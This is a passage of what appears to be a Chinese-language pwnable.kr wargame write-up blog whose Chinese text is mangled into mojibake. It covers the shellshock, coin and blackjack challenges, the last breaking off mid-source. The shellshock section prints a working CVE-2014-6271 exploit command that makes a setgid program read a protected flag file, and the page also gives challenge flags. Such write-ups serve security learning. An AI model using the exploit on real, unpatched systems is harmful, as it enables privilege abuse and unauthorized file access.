./mistake do not bruteforce...0000000000input password : 1111111111Password OKMommy, the operator priority always confuses me :(</code></pre><h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><h3 id="È¢òÁõÆ-9"><a href="#È¢òÁõÆ-9" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setresgid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-9"><a href="#ÂàÜÊûê-9" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Á†¥Â£≥ÊºèÊ¥ûÁöÑÂà©Áî®Ôºå<a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ËøôÁØáÊñáÁ´†</a>Â•ΩÁÇπ</p><p>Êü•ÁúãÊúâÊºèÊ¥ûÁöÑ bash ÁâàÊú¨</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ./bash --versionGNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</code></pre><p>ÂêåÊó∂Ê≥®ÊÑèÂà∞Êñá‰ª∂ÊùÉÈôê</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ls -sailtotal 98023593359   4 drwxr-x---   5 root shellshock       4096 Oct 23  2016 .23593232   4 drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..23593368 940 -r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash23593367   4 d---------   2 root root             4096 Oct 12  2014 .bash_history23593366   4 -r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag23593364   4 dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi23593361   4 drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache23593363  12 -r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock23593360   4 -r--r--r--   1 root root              188 Oct 12  2014 shellshock.c</code></pre><h3 id="Ëß£È¢ò-9"><a href="#Ëß£È¢ò-9" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ env x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)</code></pre><h2 id="11-coin"><a href="#11-coin" class="headerlink" title="11. coin"></a>11. coin</h2><h3 id="È¢òÁõÆ-10"><a href="#È¢òÁõÆ-10" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-shell"><code class="language-shell">    ---------------------------------------------------    -              Shall we play a game?              -    ---------------------------------------------------    You have given some gold coins in your hand    however, there is one counterfeit coin among them    counterfeit coin looks exactly same as real coin    however, its weight is different from real one    real coin weighs 10, counterfeit coin weighes 9    help me to find the counterfeit coin with a scale    if you find 100 counterfeit coins, you will get reward :)    FYI, you have 60 seconds.    - How to play -     1. you get a number of coins (N) and number of chances (C)    2. then you specify a set of index numbers of coins to be weighed    3. you get the weight information    4. 2~3 repeats C time, then you give the answer    - Example -    [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial    [Client] 0 1         # weigh first and second coin    [Server] 20            # scale result : 20    [Client] 3            # weigh fourth coin    [Server] 10            # scale result : 10    [Client] 2             # counterfeit coin is third!    [Server] Correct!    - Ready? starting in 3 sec... -</code></pre><h3 id="ÂàÜÊûê-10"><a href="#ÂàÜÊûê-10" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‰∫åÂàÜÊ≥ïÊâæ coin</p><h3 id="Ëß£È¢ò-10"><a href="#Ëß£È¢ò-10" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ËøúÁ®ãË∑ëÂÆπÊòìÂèóÂà∞ÁΩëÁªúÂΩ±ÂìçÔºåÊé®ËçêÈÉ®ÁΩ≤Âà∞<code>/tmp/</code>ÈáåÊú¨Âú∞Ë∑ëÔºåÈùûÂ∏∏Âø´</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> re <span class="token keyword">import</span> compileconn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>int<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    status <span class="token operator">=</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;-] recv: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>    NC <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^N=([0-9]*) C=([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    W <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> NC<span class="token punctuation">:</span>        end <span class="token operator">=</span> int<span class="token punctuation">(</span>NC<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span>         status <span class="token operator">=</span> <span class="token boolean">True</span>      <span class="token keyword">elif</span> W<span class="token punctuation">:</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>W<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">:</span>            fp <span class="token operator">=</span> sp        tp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>tp<span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tp<span class="token punctuation">)</span>        status <span class="token operator">=</span> <span class="token boolean">True</span>     <span class="token keyword">elif</span> <span class="token string">"format error"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"time expired"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>.&lt; Bye..."</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> status<span class="token punctuation">:</span>        data <span class="token operator">=</span> getList<span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] send: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><pre class=" language-shell"><code class="language-shell">[<-] recv: Congrats! get your flagb1NaRy_S34rch1nG_1s_3asy_p3asy</code></pre><h2 id="12-blackjeck"><a href="#12-blackjeck" class="headerlink" title="12. blackjeck"></a>12. blackjeck</h2><h3 id="È¢òÁõÆ-11"><a href="#È¢òÁõÆ-11" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><p>ÂéüÂú∞ÂùÄÔºö<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Programmer: Vladislav Shulman</span><span class="token comment" spellcheck="true">// Final Project</span><span class="token comment" spellcheck="true">// Blackjack</span><span class="token comment" spellcheck="true">// Feel free to use any and all parts of this program and claim it as your own work</span><span class="token comment" spellcheck="true">//FINAL DRAFT</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span>                </span><span class="token comment" spellcheck="true">//Used for srand((unsigned) time(NULL)) command</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;process.h></span>             </span><span class="token comment" spellcheck="true">//Used for system("cls") command</span><span class="token macro property">#<span class="token directive keyword">define</span> spade 06                 </span><span class="token comment" spellcheck="true">//Used to print spade symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> club 05                  </span><span class="token comment" spellcheck="true">//Used to print club symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> diamond 04               </span><span class="token comment" spellcheck="true">//Used to print diamond symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> heart 03                 </span><span class="token comment" spellcheck="true">//Used to print heart symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> RESULTS "Blackjack.txt"  </span><span class="token comment" spellcheck="true">//File name is Blackjack</span><span class="token comment" spellcheck="true">//Global Variables</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> l<span class="token punctuation">;</span><span class="token keyword">int</span> d<span class="token punctuation">;</span><span class="token keyword">int</span> won<span class="token punctuation">;</span><span class="token keyword">int</span> loss<span class="token punctuation">;</span><span class="token keyword">int</span> cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span><span class="token keyword">int</span> bet<span class="token punctuation">;</span><span class="token keyword">int</span> random_card<span class="token punctuation">;</span><span class="token keyword">int</span> player_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> dealer_total<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Function Prototypes</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Generates random card</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Asks user to continue</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" menu</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Plays game</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Asks if user wants to continue playing</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token comment" spellcheck="true">//Main Function</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> choice1<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n              222                111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n            222 222            11111                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           222   222          11 111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                222              111                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n               222               111                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                        21                                   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n         222                     111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        222                      111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n       222                       111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      222222222222222      111111111111111                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      2222222222222222    11111111111111111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//end program</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to continue</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>    <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 Are You Ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                ----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                      (Y/N)\n                        "</span><span class="token punctuation">)</span><span 